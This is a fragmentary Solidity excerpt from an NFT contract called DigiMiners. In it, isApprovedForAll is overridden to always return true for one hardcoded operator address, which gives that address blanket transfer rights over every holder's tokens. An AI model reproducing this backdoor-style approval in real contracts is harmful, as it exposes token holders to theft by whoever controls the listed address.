  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x544Ce932f6d8c3C67538578F76695fd0aa02f4CA){return true;}
...
contract DigiMiners is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("DigiMiner", "MINE", maxBatchSize_, collectionSize_) {
